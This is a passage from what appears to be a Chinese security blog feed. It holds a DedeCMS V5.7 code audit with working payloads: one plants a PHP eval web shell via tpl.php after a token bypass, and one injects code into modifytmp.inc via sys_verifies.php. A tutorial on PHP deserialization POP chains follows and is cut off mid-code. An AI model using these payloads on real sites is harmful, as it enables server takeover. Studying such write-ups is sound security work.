class="variable">$wecome_info</span> = <span class="string">&quot;&lt;a href=&#x27;templets_tagsource.php&#x27;&gt;标签源码碎片管理&lt;/a&gt; &amp;gt;&amp;gt; 修改/新建标签&quot;</span>;</span><br><span class="line">    <span class="variable">$win</span> = <span class="keyword">new</span> <span class="title class_">OxWindow</span>();</span><br><span class="line">    <span class="variable">$win</span>-&gt;<span class="title function_ invoke__">AddTitle</span>(<span class="string">&quot;修改/新建标签：&quot;</span>);</span><br><span class="line">    <span class="variable">$win</span>-&gt;<span class="title function_ invoke__">AddMsgItem</span>(<span class="variable">$msg</span>);</span><br><span class="line">    <span class="variable">$winform</span> = <span class="variable">$win</span>-&gt;<span class="title function_ invoke__">GetWindow</span>(<span class="string">&quot;hand&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">    <span class="variable">$win</span>-&gt;<span class="title function_ invoke__">Display</span>();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在 253 到 267 有一处，savetagfile 在绕过 csrf_check() 之后 可以以 xxx.lib.php 的格式 向 taglib 写入 php 文件</p></blockquote><p>csrf_check()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">csrf_check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$token</span>) || <span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$token</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]) != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;http://bbs.dedecms.com/907721.html&quot;&gt;DedeCMS:CSRF Token Check Failed!&lt;/a&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那怎么获取到 token 呢？继续看tpl.php 上面的代码，发现一处：</p><img src="/2021/10/15/DedeCMS-V5-7-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.png" class=""><p>那就很简单了，只需要在此页面文件上传的地方，拿token 即可</p><img src="/2021/10/15/DedeCMS-V5-7-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/7.png" class=""><blockquote><p>$action &#x3D;&#x3D; ‘savetagfile’   构造payload  （只是 文件名以 xxx.lib.php  的形式就可以了）</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tpl.php?action=savetagfile&amp;token=f8b8dede34f938d6414555f881ca9bdf&amp;filename=copper.lib.php&amp;content=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时已getshell</p><img src="/2021/10/15/DedeCMS-V5-7-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/8.png" class=""><h4 id="第二处"><a href="#第二处" class="headerlink" title="第二处"></a>第二处</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dede/sys_verifies.php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*-----------------------</span></span><br><span class="line"><span class="comment">下载文件</span></span><br><span class="line"><span class="comment">function _getfiles()</span></span><br><span class="line"><span class="comment">------------------------*/</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> == <span class="string">&#x27;getfiles&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$refiles</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&quot;你没进行任何操作！&quot;</span>,<span class="string">&quot;sys_verifies.php&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$cacheFiles</span> = DEDEDATA.<span class="string">&#x27;/modifytmp.inc&#x27;</span>;</span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$cacheFiles</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&#x27;&lt;&#x27;</span>.<span class="string">&#x27;?php&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&#x27;$tmpdir = &quot;&#x27;</span>.<span class="variable">$tmpdir</span>.<span class="string">&#x27;&quot;;&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">    <span class="variable">$dirs</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$i</span> = -<span class="number">1</span>;</span><br><span class="line">    <span class="variable">$adminDir</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;#(.*)[\/\\\\]#&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$refiles</span> <span class="keyword">as</span> <span class="variable">$filename</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$filename</span>,<span class="number">3</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>)-<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;#^dede/#i&quot;</span>, <span class="variable">$filename</span>)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$curdir</span> = <span class="title function_ invoke__">GetDirName</span>( <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;#^dede/#i&quot;</span>, <span class="variable">$adminDir</span>.<span class="string">&#x27;/&#x27;</span>, <span class="variable">$filename</span>) );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$curdir</span> = <span class="title function_ invoke__">GetDirName</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( !<span class="keyword">isset</span>(<span class="variable">$dirs</span>[<span class="variable">$curdir</span>]) ) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$dirs</span>[<span class="variable">$curdir</span>] = <span class="title function_ invoke__">TestIsFileDir</span>(<span class="variable">$curdir</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&#x27;$files[&#x27;</span>.<span class="variable">$i</span>.<span class="string">&#x27;] = &quot;&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;&quot;;&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        <span class="comment">// &quot; \&quot;;\ &quot; ;</span></span><br><span class="line">        <span class="comment">// \&quot;;\)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&#x27;$fileConut = &#x27;</span>.<span class="variable">$i</span>.<span class="string">&#x27;;&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;&gt;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$dirinfos</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span> &gt; -<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$dirinfos</span> = <span class="string">&#x27;&lt;tr bgcolor=&quot;#ffffff&quot;&gt;&lt;td colspan=&quot;2&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$dirinfos</span> .= <span class="string">&quot;本次升级需要在下面文件夹写入更新文件，请注意文件夹是否有写入权限：&lt;br /&gt;\r\n&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$dirs</span> <span class="keyword">as</span> <span class="variable">$curdir</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$dirinfos</span> .= <span class="variable">$curdir</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; 状态：&quot;</span>.(<span class="variable">$curdir</span>[<span class="string">&#x27;writeable&#x27;</span>] ? <span class="string">&quot;[√正常]&quot;</span> : <span class="string">&quot;&lt;font color=&#x27;red&#x27;&gt;[×不可写]&lt;/font&gt;&quot;</span>).<span class="string">&quot;&lt;br /&gt;\r\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$dirinfos</span> .= <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;\r\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="variable">$doneStr</span> = <span class="string">&quot;&lt;iframe name=&#x27;stafrm&#x27; src=&#x27;sys_verifies.php?action=down&amp;curfile=0&#x27; frameborder=&#x27;0&#x27; id=&#x27;stafrm&#x27; width=&#x27;100%&#x27; height=&#x27;100%&#x27;&gt;&lt;/iframe&gt;\r\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">include</span>(DEDEADMIN.<span class="string">&#x27;/templets/sys_verifies_getfiles.htm&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在 156 - 190 之间，有一处后台写配置文件过滤不足导致可以写shell</p></blockquote><p>可以看到<code>$refiles</code>数组中的内容通过遍历数组写入了配置文件<code>modifytmp.inc</code>中</p><blockquote><p>由于 dedecms对于输入是全局过滤的，在 <code>/include/common.inc.php</code>中注册并过滤了外部提交的变量</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//是否启用mb_substr替换cn_substr来提高效率</span></span><br><span class="line"><span class="variable">$cfg_is_mb</span> = <span class="variable">$cfg_is_iconv</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;mb_substr&#x27;</span>)) <span class="variable">$cfg_is_mb</span> = <span class="literal">TRUE</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;iconv_substr&#x27;</span>)) <span class="variable">$cfg_is_iconv</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_RunMagicQuotes</span>(<span class="params">&amp;<span class="variable">$svar</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">is_array</span>(<span class="variable">$svar</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$svar</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) <span class="variable">$svar</span>[<span class="variable">$_k</span>] = <span class="title function_ invoke__">_RunMagicQuotes</span>(<span class="variable">$_v</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>( <span class="title function_ invoke__">strlen</span>(<span class="variable">$svar</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#&#x27;</span>,<span class="variable">$svar</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">exit</span>(<span class="string">&#x27;Request var not allow!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$svar</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$svar</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$svar</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DEDEREQUEST&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//检查和注册外部提交的变量   (2011.8.10 修改登录时相关过滤)</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">CheckRequest</span>(<span class="params">&amp;<span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$_k</span>=&gt;<span class="variable">$_v</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$_k</span> == <span class="string">&#x27;nvarname&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="title function_ invoke__">CheckRequest</span>(<span class="variable">$_k</span>);</span><br><span class="line">                <span class="title function_ invoke__">CheckRequest</span>(<span class="variable">$val</span>[<span class="variable">$_k</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>( <span class="title function_ invoke__">strlen</span>(<span class="variable">$val</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#&#x27;</span>,<span class="variable">$val</span>)  )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&#x27;Request var not allow!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//var_dump($_REQUEST);exit;</span></span><br><span class="line">    <span class="title function_ invoke__">CheckRequest</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="title function_ invoke__">CheckRequest</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="title function_ invoke__">Array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_k</span> == <span class="string">&#x27;nvarname&#x27;</span>) $&#123;<span class="variable">$_k</span>&#125; = <span class="variable">$_v</span>;</span><br><span class="line"><span class="keyword">else</span> $&#123;<span class="variable">$_k</span>&#125; = <span class="title function_ invoke__">_RunMagicQuotes</span>(<span class="variable">$_v</span>);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的<code>$refiles</code> 为注册的外部变量，可见已经<code>addslashes</code>了而我们还是需要绕过<code>fwrite($fp, &#39;$files[&#39;.$i.&#39;] = &quot;&#39;.$filename.&#39;&quot;;&#39;.&quot;\r\n&quot;);</code>实现注入shell，首先需要注入就必须闭合双引号，这里在源代码中，写了一个 substr 正巧剔除了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dede/sys_verifies.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$filename</span>,<span class="number">3</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>)-<span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>去掉了输入的前三个字符，这样就可以写shell 了，当我们输入&quot; 时经过<code>addlashes</code>会变成\“，再去掉前三个字符就只剩下双引号实现闭合</p><p>此时可以通过之前的遍历 写入到 <code>modifytmp.inc</code>文件就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://<span class="number">10.1</span><span class="number">.1</span><span class="number">.6</span>/dede/sys_verifies.php?action=getfiles&amp;refiles[]=<span class="number">123</span>&amp;refiles[]=\%<span class="number">22</span>;phpinfo();die();//</span><br></pre></td></tr></table></figure><img src="/2021/10/15/DedeCMS-V5-7-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/9.png" class="">]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> DedeCMS-V5.7 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化利用 - POP链构造</title>
      <link href="/2021/05/10/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8-POP%E9%93%BE%E6%9E%84%E9%80%A0/"/>
      <url>/2021/05/10/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8-POP%E9%93%BE%E6%9E%84%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>POP链构造——&gt;&gt;&gt;  什么是反序列化攻击，简单说反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的。</p><h2 id="什么是POP？"><a href="#什么是POP？" class="headerlink" title="什么是POP？"></a>什么是POP？</h2><p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到恶意攻击. 而要实现 POP链的恶意构造，我们就必须了解一些常见的魔法函数</p><h2 id="魔法函数介绍"><a href="#魔法函数介绍" class="headerlink" title="魔法函数介绍"></a>魔法函数介绍</h2><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2022/05/10/zs7KN.png" data-caption="zs7KN.png"><img src="https://i.imgtg.com/2022/05/10/zs7KN.png" alt="zs7KN.png"></a></p><br><h4 id="反序列化常见的起点"><a href="#反序列化常见的起点" class="headerlink" title="反序列化常见的起点"></a>反序列化常见的起点</h4><ul><li><code>__wakeup</code> 反序列化</li><li><code>__destruct</code> 明确销毁对象或脚本结束时被调用</li><li><code>__toString</code> 当一个对象被反序列化后又被当做字符串使用</li></ul><br><h4 id="反序列化常见的中间跳板"><a href="#反序列化常见的中间跳板" class="headerlink" title="反序列化常见的中间跳板"></a>反序列化常见的中间跳板</h4><ul><li><code>__toString</code> 当一个对象被当做字符串使用</li><li><code>__get</code> 读取不可访问或不存在属性时被调用</li><li><code>__set</code> 当给不可访问或不存在属性赋值时被调用</li><li><code>__isset</code> 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 <code>$this-&gt;$func();</code></li></ul><br><h4 id="反序列化常见终点"><a href="#反序列化常见终点" class="headerlink" title="反序列化常见终点"></a>反序列化常见终点</h4><ul><li><code>__call</code> 调用不可访问或不存在的方法时被调用</li><li><code>call_user_func</code> 一般php代码执行都会选择这里</li><li><code>call_user_func_array</code> 一般php代码执行都会选择这里</li></ul><br><h3 id="关于魔法函数的一些功能"><a href="#关于魔法函数的一些功能" class="headerlink" title="关于魔法函数的一些功能"></a>关于魔法函数的一些功能</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ABC</span></span>&#123;</span><br><span class="line"><span class="comment">//    public $test;</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$test</span> = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;调用了构造函数&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;调用了折构函数&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    function __wakeup()&#123;</span></span><br><span class="line"><span class="comment">//        echo &#x27;调用了醒来函数&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo &#x27;创建对象a&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ABC;</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo &#x27;序列化&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">//$a_ser = serialize($a);</span></span><br><span class="line"><span class="comment">//echo &#x27;反序列化&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">//$a_unser = unserialize($a_ser);</span></span><br><span class="line"><span class="comment">//echo &#x27;对象销毁&lt;br&gt;&#x27;;</span></span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2023/04/11/8BIIq.png" data-caption=""><img src="https://i.imgtg.com/2023/04/11/8BIIq.png"></a></p><p>在php中，当一个程序默认走完代码执行流程时，就会触发销毁这个对象</p><p>（在代码运行完自动释放内存之前由于对象已经没有被任何变量引用所以就自动释放了内存）</p><br><h3 id="POP链构造入门案列"><a href="#POP链构造入门案列" class="headerlink" title="POP链构造入门案列"></a>POP链构造入门案列</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag 在flag.php 里面</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span 